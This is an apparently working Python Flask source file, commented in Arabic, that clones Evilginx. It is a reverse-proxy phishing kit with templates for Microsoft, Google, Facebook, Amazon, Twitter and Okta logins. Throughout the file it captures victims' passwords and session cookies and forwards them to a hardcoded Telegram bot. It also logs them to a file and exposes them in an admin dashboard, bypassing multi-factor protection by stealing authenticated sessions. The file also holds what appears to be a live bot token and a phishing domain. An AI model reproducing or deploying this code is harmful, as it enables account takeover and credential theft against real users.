from flask import Flask, request, render_template, make_response, redirect, url_for
import requests
import logging
from urllib.parse import urlparse, urljoin, quote
import ssl
import json
from datetime import datetime
import os
import re

# ======================== الإعدادات الخاصة بك ========================
TELEGRAM_BOT_TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"  # توكين البوت
TELEGRAM_CHAT_ID = "1367401179"                                        # معرفك
# ====================================================================

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()  # مفتاح سري عشوائي وآمن

# إعداد التسجيل (Logging)
logging.basicConfig(
    filename='captured_data.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# قاموس لتخزين الجلسات المسروقة مؤقتاً
captured_sessions = {}

class PhishletHandler:
    """معالج القوالب - يشبه تماماً Phishlets في Evilginx الأصلية"""
    
    def __init__(self, name, target_domain, proxy_hosts, auth_tokens, creds_fields, auth_urls, login_config):
        self.name = name
        self.target_domain = target_domain
        self.proxy_hosts = proxy_hosts  # قائمة بالنطاقات الفرعية المطلوب بروكسيتها
        self.auth_tokens = auth_tokens  # أسماء الكوكيز المطلوب سرقتها
        self.creds_fields = creds_fields  # حقول البيانات (username, password)
        self.auth_urls = auth_urls  # عناوين URL التي تشير إلى نجاح تسجيل الدخول
        self.login_config = login_config  # معلومات نموذج تسجيل الدخول
        
    def capture_credentials(self, form_data):
        """تسجيل بيانات الدخول وإرسالها إلى تيليجرام"""
        creds = {}
        for field in self.creds_fields:
            if field in form_data:
                creds[field] = form_data[field]
        
        if creds:
            message = f"🔐 **New Credentials Captured**\n"
            message += f"🎯 **Target:** {self.name}\n"
            message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"📋 **Data:**\n```json\n{json.dumps(creds, indent=2)}\n```"
            self.send_to_telegram(message)
            logging.info(f"Credentials captured: {creds}")
        return creds
    
    def capture_session_cookies(self, response_cookies):
        """التقاط كوكيز الجلسة بعد تسجيل الدخول"""
        captured = {}
        for cookie_name in self.auth_tokens:
            if cookie_name in response_cookies:
                captured[cookie_name] = response_cookies[cookie_name]
        
        if captured:
            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            session_data = {
                'site': self.name,
                'cookies': captured,
                'timestamp': str(datetime.now())
            }
            captured_sessions[session_id] = session_data
            
            # إرسال الجلسة المسروقة إلى تيليجرام
            message = f"🎫 **New Session Token Captured!**\n"
            message += f"🎯 **Target:** {self.name}\n"
            message += f"🆔 **Session ID:** `{session_id}`\n"
            message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            cookie_msg = "\n".join([f"  • `{k}`: `{v[:50]}...`" for k, v in captured.items()])
            message += f"🍪 **Cookies:**\n{cookie_msg}\n"
            message += f"🔗 **View Full:** https://login.orvanta.dpdns.org/admin/session/{session_id}"
            self.send_to_telegram(message)
            
            logging.info(f"Session captured: {session_id} - {list(captured.keys())}")
            return session_id
        return None
    
    def send_to_telegram(self, message):
        """إرسال رسالة إلى تيليجرام"""
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            logging.error(f"Telegram error: {e}")
    
    def rewrite_content(self, content, content_type, current_host):
        """تعديل الروابط في الصفحات (sub_filters)"""
        if 'text/html' in content_type:
            # استبدال الروابط المطلقة
            for proxy in self.proxy_hosts:
                orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
                phish_domain = current_host
                content = content.replace(orig_domain, phish_domain)
                content = content.replace(f"https://{orig_domain}", f"https://{phish_domain}")
                content = content.replace(f"http://{orig_domain}", f"https://{phish_domain}")
        return content

# ======================== تعريف القوالب (Phishlets) ========================
# هذه القوالب مستوحاة من مستودع simplerhacking/Evilginx3-Phishlets

phishlets = {
    'microsoft': PhishletHandler(
        name='Microsoft',
        target_domain='login.live.com',
        proxy_hosts=[
            {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'login.live.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['ESTSAUTH', 'MSFPC', 'MSPRequ'],  # كوكيز الجلسة
        creds_fields=['login', 'passwd', 'loginfmt', 'Password'],  # حقول البيانات
        auth_urls=['https://account.live.com/proofs/Manage', 'https://account.microsoft.com'],
        login_config={'username': 'loginfmt', 'password': 'passwd', 'url': 'https://login.live.com/login.srf'}
    ),
    'google': PhishletHandler(
        name='Google',
        target_domain='accounts.google.com',
        proxy_hosts=[
            {'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['SAPISID', 'APISID', 'SSID', 'SID', 'LSID'],  # كوكيز الجلسة
        creds_fields=['email', 'password', 'identifier', 'credentials.passwd'],
        auth_urls=['https://myaccount.google.com', 'https://mail.google.com'],
        login_config={'username': 'identifier', 'password': 'password', 'url': 'https://accounts.google.com/signin/v2/identifier?service=mail'}
    ),
    'facebook': PhishletHandler(
        name='Facebook',
        target_domain='www.facebook.com',
        proxy_hosts=[
            {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'facebook.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['c_user', 'xs', 'fr', 'sb'],  # كوكيز الجلسة
        creds_fields=['email', 'pass'],
        auth_urls=['https://www.facebook.com/?sk=welcome'],
        login_config={'username': 'email', 'password': 'pass', 'url': 'https://www.facebook.com/login.php'}
    ),
    'amazon': PhishletHandler(
        name='Amazon',
        target_domain='www.amazon.com',
        proxy_hosts=[
            {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'amazon.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['session-id', 'session-token', 'ubid-main', 'x-main'],  # كوكيز الجلسة
        creds_fields=['email', 'password'],
        auth_urls=['https://www.amazon.com/?ref_=nav_signin'],
        login_config={'username': 'email', 'password': 'password', 'url': 'https://www.amazon.com/ap/signin'}
    ),
    'twitter': PhishletHandler(
        name='Twitter',
        target_domain='twitter.com',
        proxy_hosts=[
            {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'twitter.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['auth_token', 'ct0', 'twid'],  # كوكيز الجلسة
        creds_fields=['session[username_or_email]', 'session[password]'],
        auth_urls=['https://twitter.com/home'],
        login_config={'username': 'session[username_or_email]', 'password': 'session[password]', 'url': 'https://twitter.com/i/flow/login'}
    ),
    'okta': PhishletHandler(
        name='Okta',
        target_domain='login.okta.com',
        proxy_hosts=[
            {'phish_sub': 'login', 'orig_sub': 'login', 'domain': 'okta.com', 'session': True, 'is_landing': True}
        ],
        auth_tokens=['sid', 'DT', 'oktaStateToken'],  # كوكيز الجلسة
        creds_fields=['username', 'password'],
        auth_urls=['https://login.okta.com/app/UserHome'],
        login_config={'username': 'username', 'password': 'password', 'url': 'https://login.okta.com'}
    )
}

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    """
    الوكيل العكسي (Reverse Proxy) - قلب Evilginx
    هذه الدالة تتعامل مع جميع الطلبات الواردة
    """
    
    # تحديد القالب المستخدم بناءً على النطاق
    host = request.headers.get('Host', '').split(':')[0]
    current_phishlet = None
    phishlet_name = None
    
    # محاولة التعرف على القالب من النطاق
    for name, phishlet in phishlets.items():
        if name in host or phishlet.target_domain in host:
            current_phishlet = phishlet
            phishlet_name = name
            break
    
    if not current_phishlet:
        return "Page not found", 404
    
    # بناء URL الهدف الحقيقي
    target_domain = current_phishlet.target_domain
    
    # تحديد النطاق الفرعي الصحيح من proxy_hosts
    target_sub = 'www'  # افتراضي
    for proxy in current_phishlet.proxy_hosts:
        if proxy['phish_sub'] in host or (proxy['phish_sub'] == '' and '.' not in host.replace(f".{current_phishlet.target_domain}", '')):
            target_sub = proxy['orig_sub']
            break
    
    # بناء الـ URL الكامل
    if path.startswith('http'):
        target_url = path
    else:
        if target_sub:
            target_url = f"https://{target_sub}.{target_domain}/{path}"
        else:
            target_url = f"https://{target_domain}/{path}"
    
    try:
        # تجهيز الـ Headers
        headers = {
            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
            'Accept': request.headers.get('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.5'),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # إضافة Referer إذا كان موجوداً
        if request.headers.get('Referer'):
            headers['Referer'] = request.headers['Referer'].replace(host, target_domain)
        
        # نقل Cookies من الضحية
        cookies = request.cookies.to_dict()
        
        # معالجة طلبات POST والتقاط البيانات
        if request.method == 'POST':
            # التقاط بيانات النموذج
            if request.form:
                form_data = request.form.to_dict()
                current_phishlet.capture_credentials(form_data)
                
                # تعديل البيانات قبل إرسالها للموقع الحقيقي
                data = form_data.copy()
            else:
                data = request.get_data(as_text=True)
        else:
            data = None
        
        # إرسال الطلب للموقع الحقيقي
        if request.method == 'GET':
            resp = requests.get(
                target_url,
                headers=headers,
                cookies=cookies,
                verify=False,
                allow_redirects=False,
                timeout=30
            )
        else:
            resp = requests.request(
                method=request.method,
                url=target_url,
                headers=headers,
                cookies=cookies,
                data=data,
                verify=False,
                allow_redirects=False,
                timeout=30
            )
        
        # إنشاء استجابة للضحية
        response_headers = [(name, value) for name, value in resp.raw.headers.items() 
                            if name.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection']]
        
        response = make_response(resp.content)
        response.status_code = resp.status_code
        
        for name, value in response_headers:
            response.headers[name] = value
        
        # نقل Cookies من الموقع الحقيقي للضحية
        for cookie_name, cookie_value in resp.cookies.items():
            response.set_cookie(
                cookie_name,
                cookie_value,
                domain=host,  # نطاقنا المزيف
                secure=True,
                httponly=True,
                samesite='Lax'
            )
        
        # البحث عن جلسات مسروقة
        if resp.cookies:
            current_phishlet.capture_session_cookies(resp.cookies)
        
        # التحقق من نجاح تسجيل الدخول من خلال auth_urls
        if resp.status_code in [301, 302, 303]:
            location = resp.headers.get('Location', '')
            for auth_url in current_phishlet.auth_urls:
                if auth_url in location:
                    # تم تسجيل الدخول بنجاح، نسارع بسرقة الكوكيز
                    current_phishlet.capture_session_cookies(resp.cookies)
                    break
        
        # تعديل المحتوى (sub_filters)
        content_type = resp.headers.get('Content-Type', '')
        modified_content = current_phishlet.rewrite_content(resp.content.decode('utf-8', errors='ignore'), content_type, host)
        response.data = modified_content.encode('utf-8')
        
        return response
        
    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Error processing request: {str(e)}", 500

@app.route('/admin/dashboard')
def admin_dashboard():
    """لوحة تحكم المسؤول - تشبه واجهة Evilginx"""
    return render_template('dashboard.html', sessions=captured_sessions, bot_username='Amrsavebot')

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    """عرض تفاصيل الجلسة المسروقة"""
    if session_id in captured_sessions:
        response = make_response(json.dumps(captured_sessions[session_id], indent=2))
        response.headers['Content-Type'] = 'application/json'
        return response
    return "Session not found", 404

@app.route('/admin/clear')
def clear_sessions():
    """مسح جميع الجلسات (لأغراض التنظيف)"""
    captured_sessions.clear()
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    # تشغيل على HTTP (لأن Cloudflare Tunnel سيتولى HTTPS)
    print("="*50)
    print("🚀 Evilginx Clone is starting...")
    print(f"🤖 Telegram Bot: @Amrsavebot")
    print(f"👤 Your Chat ID: {TELEGRAM_CHAT_ID}")
    print("📡 Listening on http://127.0.0.1:8080")
    print("="*50)
    app.run(host='127.0.0.1', port=8080, debug=False)